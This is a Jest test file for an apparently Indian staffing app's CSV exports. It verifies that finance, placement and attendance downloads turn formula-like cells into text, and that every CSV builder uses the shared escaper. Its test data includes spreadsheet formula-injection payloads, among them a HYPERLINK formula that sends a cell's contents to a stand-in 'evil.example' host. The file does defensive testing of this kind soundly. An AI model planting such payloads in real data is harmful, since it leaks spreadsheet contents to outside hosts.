import * as fs from 'fs';
import * as path from 'path';
import { csvCell, csvLine } from './csv-cell';
import { toCsv } from '../../modules/finance/finance-csv';
import { formatPlacementsCsv, type RegulatoryPlacementExportRow } from '../../modules/placement/dto/export-placements.dto';
import { AttendanceReportsService, type MonthSheetRow } from '../../modules/attendance/attendance-reports.service';

/**
 * IN-3 / INF-6: every CSV download neutralises a cell that starts like a
 * spreadsheet formula (= + - @ tab CR), so a business name, locality or person
 * name typed as "=HYPERLINK(...)" opens as text in Excel, never as a formula.
 */
const DANGEROUS = ['=HYPERLINK("https://evil.example?x="&A1,"x")', '+91 1+1', '-2+3', '@SUM(A1)', '\t=1+1', '\r=1+1'];

function cellsOf(csv: string): string[] {
  // Enough of a CSV reader for these tests: quoted cells may hold commas, quotes and line breaks.
  const cells: string[] = [];
  let i = 0;
  while (i < csv.length) {
    if (csv[i] === '"') {
      let value = '';
      i += 1;
      while (i < csv.length) {
        if (csv[i] === '"' && csv[i + 1] === '"') { value += '"'; i += 2; continue; }
        if (csv[i] === '"') { i += 1; break; }
        value += csv[i++];
      }
      cells.push(value);
    } else {
      let value = '';
      while (i < csv.length && csv[i] !== ',' && csv[i] !== '\n') value += csv[i++];
      cells.push(value);
    }
    if (csv[i] === ',' || csv[i] === '\n') i += 1;
  }
  return cells;
}

function expectNeutralised(csv: string, value: string) {
  const cells = cellsOf(csv);
  expect(cells).toContain(`'${value}`);
  expect(cells).not.toContain(value);
}

describe('CSV formula guard (IN-3 / INF-6)', () => {
  it.each(DANGEROUS)('csvCell writes %j as text', (value) => {
    const cell = csvCell(value);
    const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
    expect(unquoted).toBe(`'${value}`);
  });

  it('keeps plain numbers (also negative) and ordinary text unchanged', () => {
    expect(csvCell(-8000)).toBe('-8000');
    expect(csvCell('-8000.00')).toBe('-8000.00');
    expect(csvCell('Ravi Kumar')).toBe('Ravi Kumar');
    expect(csvCell(null)).toBe('');
    expect(csvLine(['a,b', 'c"d'])).toBe('"a,b","c""d"');
  });

  it.each(DANGEROUS)('finance toCsv neutralises %j', (value) => {
    expectNeutralised(toCsv(['Party'], [[value]], 'ceo'), value);
  });

  it.each(DANGEROUS)('the placements export neutralises %j in the business name and locality', (value) => {
    const row: RegulatoryPlacementExportRow = {
      placementCode: 'PL-00001', joinedDate: '2026-11-01', dropoutDate: '', tradeSkill: 'Cook',
      candidateCode: 'JS-00001', employerCode: 'BZ-00001', employerName: value, monthlySalaryINR: 15000,
      placementFeeINR: 7500, status: 'active', locality: value, city: 'Bengaluru',
    };
    const csv = formatPlacementsCsv([row], { viewerRole: 'ceo' });
    expect(cellsOf(csv).filter((cell) => cell === `'${value}`)).toHaveLength(2);
    expect(cellsOf(csv)).not.toContain(value);
  });

  it.each(DANGEROUS)('the attendance month sheet neutralises %j in the staff name', (value) => {
    const service = Object.create(AttendanceReportsService.prototype) as AttendanceReportsService;
    const row: MonthSheetRow = {
      staffCode: 'CA-00001', name: value, role: 'call_agent', workingDays: 26, holidays: 0, fullDays: 26, halfDays: 0,
      paidLeaveDays: 0, absentDays: 0, unpaidLeaveDays: 0, paidDays: 26, unpaidDays: 0, deductibleShortfallMinutes: 0,
    };
    expectNeutralised(service.monthSheetCsv([row], 'ceo'), value);
  });

  /**
   * Every file in src/ that builds CSV text writes its cells with the shared
   * csvCell / csvLine / toCsv: no hand-rolled escaping that forgets the formula guard.
   */
  it('every CSV builder in src/ uses the shared csvCell', () => {
    const root = path.resolve(__dirname, '../..');
    const files: string[] = [];
    const walk = (dir: string) => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) walk(full);
        else if (entry.name.endsWith('.ts') && !entry.name.endsWith('.spec.ts') && !full.includes(`${path.sep}test-support${path.sep}`)) files.push(full);
      }
    };
    walk(root);
    const shared = [path.join(root, 'common/csv/csv-cell.ts')];
    const builders: string[] = [];
    const offenders: string[] = [];
    for (const file of files) {
      if (shared.includes(file)) continue;
      const source = fs.readFileSync(file, 'utf8');
      if (!/csv/i.test(source)) continue;
      // Writes CSV text: joins cells with commas, or defines its own cell escaper.
      const joinsCells = /\.join\(\s*['"],['"]\s*\)/.test(source) || /csvLine\(|csvCell\b|toCsv\(/.test(source);
      if (!joinsCells) continue;
      const rel = path.relative(root, file);
      builders.push(rel);
      const ownEscaper = /(?:function|const|private)\s+(?:escapeCsv|csvCell|csvEscape|escapeCell)\b/.test(source)
        && !/export\s*\{\s*csvCell/.test(source);
      const usesShared = /from\s+['"][./]*(?:common\/csv\/)?csv-cell['"]/.test(source) || /from\s+['"][./]*(?:modules\/finance\/|finance\/)?finance-csv['"]/.test(source)
        || /from\s+['"]\.\/finance-csv['"]/.test(source);
      if (ownEscaper || !usesShared) offenders.push(rel);
    }
    expect(offenders).toEqual([]);
    // The check really found the builders (a broken scan would pass vacuously).
    expect(builders).toEqual(expect.arrayContaining([
      path.join('modules', 'finance', 'finance-csv.ts'),
      path.join('modules', 'placement', 'dto', 'export-placements.dto.ts'),
      path.join('modules', 'refund-priority', 'refund-priority.service.ts'),
      path.join('modules', 'attendance', 'attendance-reports.service.ts'),
    ]));
  });
});
